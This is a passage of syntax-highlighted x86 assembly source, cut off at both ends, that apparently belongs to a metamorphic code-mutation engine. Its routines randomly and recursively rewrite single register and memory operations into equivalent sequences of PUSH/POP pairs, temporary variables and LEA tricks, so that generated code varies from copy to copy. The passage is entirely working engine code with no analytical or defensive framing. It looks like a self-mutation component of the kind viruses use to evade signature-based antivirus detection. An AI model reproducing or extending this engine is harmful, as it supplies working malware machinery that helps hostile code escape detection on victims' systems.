                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_CMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc0">          </span><span class="sc1">; ECX = CMP [Mem],Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">          </span><span class="sc1">; EDX = SUB [Mem],Reg</span><span class="sc0">
   </span><span class="sc5">@@Double_CMPTEST_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">     </span><span class="sc1">; Select if we do a normal OP or</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; this special one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">     </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">    </span><span class="sc1">; Make a MOV [TempVar],dstReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">     </span><span class="sc1">; Now select randomly if we use the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; contents of ECX (CMP/AND) or</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_CMPTEST_Next</span><span class="sc0"> </span><span class="sc1">; EDX (SUB/TEST)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@Double_CMPTEST_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the size into the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Make directly the instrc.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">    </span><span class="sc1">; (not recursive). This is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; because the flags must not</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; be altered after performing</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; this instruction.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_TEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc0">                 </span><span class="sc1">; ECX = AND [Mem],Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">                 </span><span class="sc1">; EDX = TEST [Mem],Reg (in</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_CMPTEST_Common</span><span class="sc0">    </span><span class="sc1">; fact, the same as 4A)</span><span class="sc0">

   </span><span class="sc1">;; Single OP Reg,Reg instruction</span><span class="sc0">
   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check the operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_MOV</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD</span><span class="sc0">
   </span><span class="sc5">@@Single_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; Make it "OP Reg,Reg"</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set the size of operands</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Set the source register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the size of the op.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; If it's 8 bits, make a</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">                </span><span class="sc1">; normal, generic operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Select randomly if we make</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">                </span><span class="sc1">; this special op or not</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">                </span><span class="sc1">; Make a LEA Reg,[Reg2]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; If 8 bits, we cannot use LEA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">               </span><span class="sc1">; Make LEA Reg,[Reg+Reg2]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This generates an OP Reg,Mem. As the functions above, we check for special</span><span class="sc0">
</span><span class="sc1">;; cases and we treat them, so the mutation is even more variated.</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Single if the recursivity level is</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">        </span><span class="sc1">; too high to make more recursion</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Select "Single instruction" with a</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">        </span><span class="sc1">; probability of 1/8</span><span class="sc0">
   </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; 8 bits?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">                       </span><span class="sc1">; Then make it single</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_MOV</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">         </span><span class="sc1">; Generate a PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">            </span><span class="sc1">; Allocate a temp. variable</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">             </span><span class="sc1">; Generate a POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">           </span><span class="sc1">; Generate a OP Reg,[TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Multiple_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">       </span><span class="sc1">; Randomly decide if we make the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; normal operation</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">       </span><span class="sc1">; Generate PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">        </span><span class="sc1">; Generate POP Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; Set OP Reg,[Mem]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; Function to generate an OP [Mem],Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
   </span><span class="sc5">@@Start</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Single if recurs. level is too high to</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">       </span><span class="sc1">; recurse</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">       </span><span class="sc1">; Select single with a prob. of 7/8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
   </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">           </span><span class="sc1">; Select single if the size of the</span><span class="sc0">
                                         </span><span class="sc1">; operands is 8 bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_MOV</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">        </span><span class="sc1">; Make the sequence:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">           </span><span class="sc1">; PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">           </span><span class="sc1">; POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">            </span><span class="sc1">; OP [TempVar],Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; PUSH [TempVar]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                </span><span class="sc1">; POP [Mem]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_OP_CMP</span><span class="sc0">         </span><span class="sc1">; or if operation is CMP/TEST:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                </span><span class="sc1">; PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_OP_TEST</span><span class="sc0">        </span><span class="sc1">; POP [TempVar]</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP_Common</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; CMP/TEST [TempVar],Reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">          </span><span class="sc1">; That CMP/TEST can be also</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">           </span><span class="sc1">; SUB/AND, since we can modify</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">     </span><span class="sc1">; [TempVar] as we want.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Multiple_OP_CMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">
